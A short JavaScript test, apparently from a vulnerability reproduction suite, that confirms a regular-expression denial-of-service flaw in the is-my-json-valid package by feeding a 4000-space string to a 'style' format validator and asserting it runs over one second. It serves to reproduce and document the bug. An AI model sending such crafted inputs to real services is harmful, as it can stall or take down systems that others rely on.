test("ReDos in is-my-json-valid", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const imjv = require("is-my-json-valid");
  const validate = imjv({
    maxLength: 100,
    format: "style",
  });
  let t = measureTime(function () {
    validate(" ".repeat(4000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
